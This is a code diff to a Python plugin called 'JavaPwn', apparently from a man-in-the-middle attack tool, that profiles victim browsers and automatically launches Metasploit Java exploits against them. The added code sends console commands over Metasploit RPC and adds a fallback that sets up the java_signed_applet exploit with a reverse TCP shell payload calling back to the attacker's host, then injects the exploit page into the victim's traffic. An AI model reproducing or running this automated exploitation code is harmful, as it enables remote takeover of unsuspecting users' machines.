@@ -94,7 +94,21 @@ class JavaPwn(BrowserProfiler, Plugin):
 
         self.html_payload = self.get_payload()  # restart the BrowserProfiler plugin
 
-    def pwn(self, msfinstance):
+    def send_command(self, cmd, msf, vic_ip):
+        try:
+            logging.info("%s >> sending commands to metasploit" % vic_ip)
+
+            #Create a virtual console
+            console_id = msf.call('console.create')['id']
+
+            #write the cmd to the newly created console
+            msf.call('console.write', [console_id, cmd])
+
+            logging.info("%s >> commands sent succesfully" % vic_ip)
+        except Exception, e:
+            logging.info('%s >> Error accured while interacting with metasploit: %s:%s' % (vic_ip, Exception, e))  
+
+    def pwn(self, msf):
         while True:
             if (len(self.dic_output) > 0) and self.dic_output['java_installed'] == '1':  #only choose clients that we are 100% sure have the java plugin installed and enabled
 
@@ -116,8 +130,6 @@ class JavaPwn(BrowserProfiler, Plugin):
                         exploit = self.javaVersionDic[min_version]  #get the exploit string for that version
 
                         logging.info("%s >> client is vulnerable to %s!" % (vic_ip, exploit))
-
-                        msf = msfinstance
 
                         #here we check to see if we already set up the exploit to avoid creating new jobs for no reason
                         jobs = msf.call('job.list')  #get running jobs
@@ -146,28 +158,24 @@ class JavaPwn(BrowserProfiler, Plugin):
 
                             logging.debug("command string:\n%s" % cmd)
 
-                            try:
-                                logging.info("%s >> sending commands to metasploit" % vic_ip)
-
-                                #Create a virtual console
-                                console_id = msf.call('console.create')['id']
-
-                                #write the cmd to the newly created console
-                                msf.call('console.write', [console_id, cmd])
-
-                                logging.info("%s >> commands sent succesfully" % vic_ip)
-                            except Exception, e:
-                                logging.info('%s >> Error accured while interacting with metasploit: %s:%s' % (vic_ip, Exception, e))
+                            self.send_command(cmd, msf, vic_ip)
 
                             self.injectWait(msf, rand_url, vic_ip)
                     else:
                         logging.info("%s >> client is not vulnerable to any java exploit" % vic_ip)
-                        self.sploited_ips.append(vic_ip)
-                        sleep(0.5)
-                else:
-                    sleep(0.5)
-            else:
-                sleep(0.5)
+                        logging.info("%s >> falling back to the signed applet attack" % vic_ip)
+
+                        cmd = "use exploit/multi/browser/java_signed_applet\n"
+                        cmd += "set SRVPORT %s\n" % self.msfport
+                        cmd += "set URIPATH %s\n" % rand_url
+                        cmd += "set PAYLOAD generic/shell_reverse_tcp\n"  #chose this payload because it can be upgraded to a full-meterpreter (plus its multi-platform! Yay java!)
+                        cmd += "set LHOST %s\n" % self.msfip
+                        cmd += "set LPORT %s\n" % rand_port
+                        cmd += "exploit -j\n"
+
+                        self.send_command(cmd, msf, vic_ip)
+                        self.injectWait(msf, rand_url, vic_ip)
+            sleep(1)
 
     def add_options(self, options):
         options.add_argument('--msfip', dest='msfip', help='IP Address of MSF')
